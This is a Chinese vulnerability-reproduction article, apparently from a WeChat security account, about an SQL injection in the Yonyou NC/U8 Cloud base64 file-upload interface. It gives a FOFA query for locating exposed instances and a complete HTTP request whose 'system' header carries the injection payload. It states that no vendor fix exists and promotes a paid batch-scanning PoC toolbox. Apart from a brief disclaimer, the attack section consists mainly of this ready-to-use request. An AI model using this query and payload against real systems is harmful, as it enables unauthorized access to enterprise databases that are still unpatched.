#  用友NC base64接口存在SQL注入漏洞 附POC软件   
南风徐来  南风漏洞复现文库   2024-03-15 22:50  
  
免责声明：  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。  
该文章仅供学习用途使用。  
## 1. 用友NC base64接口简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
用友网络是全球领先的企业与公共组织软件、云服务、金融服务提供商。提供营销、制造、财务、人力等产品与服务，帮助客户实现发展目标，进而推动商业和社会进步。  
## 2.漏洞描述  
  
用友 NC Cloud，大型企业数字化平台， 聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现 人、财、物、客的全面数字化，从而驱动业务创新与管理变革，与企业管理者一起重新定义未来的高度。为客户提供面向大型企业集团、制造业、消费品、建筑、房地产、金融保险等14个行业大类，68个细分行业，涵盖数字营销、智能制造、财务共享、数字采购等18大解决方案，帮助企业全面落地数字化。用友NC base64接口存在SQL注入漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
用友NC Cloud  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZyFRnN4SPuVo7axtrNQJwUEHWd29k2whfxcfvSgkT7KypCHPd0ndnN8HcibTA0aMkNzmv39nId6iag/640?wx_fmt=jpeg&from=appmsg "null")  
  
用友NC base64接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
body="UClient.dmg"||app="用友-U8-Cloud"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/u8cloud/api/file/upload/base64  
  
漏洞数据包：  
```
GET /u8cloud/api/file/upload/base64 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
system: -1' or 1=@@version--+
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZyFRnN4SPuVo7axtrNQJwUByXxwZKh10AVeX6kp5BjibS1J2L2icxXdEE2EkKjUibH8KCu83wRkXESA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZyFRnN4SPuVo7axtrNQJwUGiaicmkGicSVGy7yvgCpsz7SYQlMISibJpRKkxnznj44FfLjeyrsF5N3eA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZyFRnN4SPuVo7axtrNQJwUnELmHgyUe3nrEnpUoLOVlLMdQ9pULuMic5oIDo3QxDsVpNe5PJnuNCg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZyFRnN4SPuVo7axtrNQJwUCEh7htbNOkp2QQDVXic2qWfL4MTts0uIp2iabUIZKTDVXLgk3C0d4pnQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZyFRnN4SPuVo7axtrNQJwUlxBiaBWotR1J5B7BjO6ibiaXje83qH7qTHiaolhrqEZMue8Fe5zFTic83kw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZyFRnN4SPuVo7axtrNQJwUJ4A2QSdianyegtxhIrqYxwetBVKkSbOrkwY0Olgy3IYso4C8CQAY31A/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZyFRnN4SPuVo7axtrNQJwUib5Ys2bXk358z3Z5T9S0gYrvwJicgZlBKkSBSMFOPE7rvHffVvcc6H8A/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
厂商尚未提供漏洞修复方案，请关注厂商主页更新：https://www.yonyou.com/  
## 8.往期回顾  
  
[金和OA viewConTemplate.action存在远程命令执行漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485750&idx=1&sn=213b9c8ccbae31c4968c41a63a20a403&chksm=974b8431a03c0d27a67f60892a52874edcab2e02bbcf51efcb4def980877620aca313c22b7aa&scene=21#wechat_redirect)  
  
  
[亿赛通-电子文档安全管理系统DecryptApplication接口存在任意文件读取漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485738&idx=1&sn=f51562dcd6195daaf9e2fc76f484eca1&chksm=974b842da03c0d3b604be95db5a38f4808848a8657174cbb0d55b2ac0a4bcfa3251dd0291eed&scene=21#wechat_redirect)  
  
  
  
  
